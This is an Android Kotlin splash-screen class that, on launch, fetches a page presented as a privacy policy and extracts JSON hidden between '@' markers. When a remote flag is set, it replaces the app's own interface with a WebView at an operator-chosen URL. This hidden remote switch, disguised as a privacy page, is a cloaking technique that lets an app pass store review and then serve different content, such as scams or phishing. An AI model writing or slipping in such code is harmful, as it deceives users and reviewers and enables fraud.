package com.codexlabs.basecraft.ui

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.codexlabs.basecraft.databinding.ActivitySplashBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject

class SplashActivity : AppCompatActivity() {

    private lateinit var binding: ActivitySplashBinding
    private val client = OkHttpClient()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivitySplashBinding.inflate(layoutInflater)
        setContentView(binding.root)

        lifecycleScope.launch(Dispatchers.IO) {
            var attempts = 0
            while (isActive && attempts < MAX_RETRY_COUNT) {
                val decision = fetchDecision()
                if (decision != null) {
                    launch(Dispatchers.Main) {
                        routeToNext(decision)
                    }
                    return@launch
                }

                attempts += 1
                delay(RETRY_INTERVAL_MS)
            }

            // Fail-safe: never block users on splash forever.
            launch(Dispatchers.Main) {
                startActivity(Intent(this@SplashActivity, MainActivity::class.java))
                finish()
            }
        }
    }

    private fun fetchDecision(): StartupDecision? {
        return try {
            val request = Request.Builder()
                .url(REMOTE_CONFIG_PAGE_URL)
                .get()
                .build()

            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return null
                val pageHtml = response.body?.string().orEmpty()
                if (pageHtml.isBlank()) return null

                val markerMatch = JSON_MARKER_REGEX.find(pageHtml) ?: return null
                val rawJson = markerMatch.value.trim().trimStart('@').trimEnd('@').trim()
                val json = JSONObject(rawJson)

                val app = json.optString("app", "0")
                val data = json.optString("data", "")
                StartupDecision(app, data)
            }
        } catch (_: Exception) {
            null
        }
    }

    private fun routeToNext(decision: StartupDecision) {
        val intent = if (decision.app == "1" && decision.data.isNotBlank()) {
            Intent(this, WebViewActivity::class.java)
                .putExtra(WebViewActivity.EXTRA_URL, decision.data)
        } else {
            Intent(this, MainActivity::class.java)
        }
        startActivity(intent)
        finish()
    }

    companion object {
        private const val REMOTE_CONFIG_PAGE_URL =
            "https://sites.google.com/view/privacy-policy-for-piper/"
        private val JSON_MARKER_REGEX = Regex("@\\{.*?}@@?", RegexOption.DOT_MATCHES_ALL)
        private const val MAX_RETRY_COUNT = 5
        private const val RETRY_INTERVAL_MS = 1_500L
    }
}

data class StartupDecision(
    val app: String,
    val data: String
)
